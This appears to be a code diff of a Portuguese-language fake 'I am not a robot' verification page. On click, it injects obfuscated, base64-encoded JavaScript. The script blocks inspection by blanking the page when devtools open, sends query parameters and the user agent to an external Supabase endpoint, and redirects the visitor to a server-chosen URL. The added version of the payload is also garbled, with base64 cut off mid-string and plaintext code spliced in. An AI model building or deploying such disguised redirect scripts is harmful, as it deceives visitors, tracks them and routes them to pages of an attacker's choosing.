@@ -17,8 +17,7 @@
 
   <style>
     body {
-      background-color: #0f172a;
-      color: #fff;
+      background: linear-gradient(135deg, #60a5fa, #93c5fd);
       font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
@@ -28,13 +27,24 @@
     }
 
     .box {
-      background: #1e293b;
-      padding: 30px;
-      border-radius: 12px;
+      background: #ffffff;
+      padding: 35px;
+      border-radius: 16px;
       text-align: center;
-      max-width: 350px;
+      max-width: 360px;
       width: 90%;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+    }
+
+    .icon {
+      font-size: 30px;
+      margin-bottom: 10px;
+    }
+
+    h2 {
+      margin: 10px 0 20px;
+      font-size: 20px;
+      color: #1e293b;
     }
 
     .checkbox {
@@ -42,22 +52,24 @@
       align-items: center;
       justify-content: center;
       gap: 10px;
-      margin-top: 20px;
+      margin-top: 15px;
       cursor: pointer;
-      font-size: 16px;
+      font-size: 15px;
+      color: #334155;
     }
 
     input[type="checkbox"] {
       width: 20px;
       height: 20px;
       cursor: pointer;
+      accent-color: #3b82f6;
     }
 
     .loading {
-      margin-top: 15px;
+      margin-top: 18px;
       display: none;
       font-size: 14px;
-      color: #94a3b8;
+      color: #64748b;
     }
   </style>
 
@@ -65,8 +77,7 @@
 <body>
 
   <div class="box">
-    <div>🔒 Verificação de Segurança</div>
-
+    <div class="icon">🔒</div>
     <h2>Confirme que você não é um robô</h2>
 
     <label class="checkbox">
@@ -90,14 +101,14 @@
 
         setTimeout(function() {
 
-          // 🔥 injeta o NOVO script do BotBrain só após clique
+          // 🔥 executa BotBrain somente após o clique
           const script = document.createElement("script");
 
-          script.innerHTML = `(function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7g8h){return decodeURIComponent(escape(atob(_0x7g8h)));};var _0x9i0j=_0x5e6f(_0x1a2b);(new Function(_0x9i0j))();})("KGZ1bmN0aW9uKCl7CnZhciBfMHhhMT0iYm90LTg0MTg3MDk3IixfMHhiMj0iaHR0cHM6Ly9nZmFrYnJkdm5mdXR6bmh5dXZydi5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdHJhY2stZXh0ZXJuYWwtY2xpY2siOwp2YXIgXzB4YzM9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgRGF0ZSgpO2RlYnVnZ2VyO3JldHVybiBuZXcgRGF0ZSgpLXQ+MTAwO307CnNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYoXzB4YzMoKSl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fSwxMDAwKTsKdmFyIF8weGQ0PWZ1bmN0aW9uKCl7dmFyIHc9d2luZG93Lm91dGVyV2lkdGgtd2luZG93LmlubmVyV2lkdGg+MTYwLGg9d2luZG93Lm91dGVySGVpZ2h0LXdpbmRvdy5pbm5lckhlaWdodD4xNjA7aWYod3x8aCl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fTsKc2V0SW50ZXJ2YWwoXzB4ZDQsNTAwKTsKKGZ1bmN0aW9uKCl7dmFyIF8weGU1PXt9O25ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCkuZm9yRWFjaChmdW5jdGlvbih2LGspe18weGU1W2tdPXY7fSk7CmZldGNoKF8weGIyLHttZXRob2Q6IlBPU1QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7c2hvcnRDb2RlOl8weGExLHF1ZXJ5UGFyYW1zOl8weGU1LHVzZXJBZ2VudDpuYXZpZ2F0b3IudXNlckFnZW50LHVybENvbXBsZXRvOndpbmRvdy5sb2NhdGlvbi5zZWFyY2guc3Vic3RyaW5nKDEpfHxudWxsfSl9KQoudGhlbihmdW5jdGlvbihyKXtyZXR1cm4gci5qc29uKCk7fSkudGhlbihmdW5jdGlvbihkKXtpZihkJiZkLnJlZGlyZWN0VXJsKXt3aW5kb3cubG9jYXRpb24uaHJlZj1kLnJlZGlyZWN0VXJsO319KS5jYXRjaChmdW5jdGlvbigpe30pOwp9KSgpOwp9KSgpOw==");`;
+          script.innerHTML = `(function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7g8h){return decodeURIComponent(escape(atob(_0x7g8h)));};var _0x9i0j=_0x5e6f(_0x1a2b);(new Function(_0x9i0j))();})("KGZ1bmN0aW9uKCl7CnZhciBfMHhhMT0iYm90LWM0YjhmYmRlIixfMHhiMj0iaHR0cHM6Ly9nZmFrYnJkdm5mdXR6bmh5dXZydi5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdHJhY2stZXh0ZXJuYWwtY2xpY2siOwp2YXIgXzB4YzM9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgRGF0ZSgpO2RlYnVnZ2VyO3JldHVybiBuZXcgRGF0ZSgpLXQ+MTAwO307CnNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYoXzB4YzMoKSl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fSwxMDAwKTsKdmFyIF8weGQ0PWZ1bmN0aW9uKCl7dmFyIHc9d2luZG93Lm91dGVyV2lkdGgtd2luZG93LmlubmVyV2lkdGg+MTYwLGg9d2luZG93Lm91dGVySGVpZ2h0LXdpbmRvdy5pbm5lckhlaWdodD4xNjA7aWYod3x8aCl{document.body.innerHTML="";window.location.href="about:blank";}};setInterval(_0x4,500);(function(){var _0xe5={};new URLSearchParams(window.location.search).forEach(function(v,k){_0xe5[k]=v;});fetch(_0xb2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({shortCode:_0xa1,queryParams:_0xe5,userAgent:navigator.userAgent,urlCompleto:window.location.search.substring(1)||null})}).then(function(r){return r.json();}).then(function(d){if(d&&d.redirectUrl){window.location.href=d.redirectUrl;}}).catch(function(){});}())})();`;
 
           document.body.appendChild(script);
 
-        }, 800);
+        }, 900);
       }
     });
   </script>
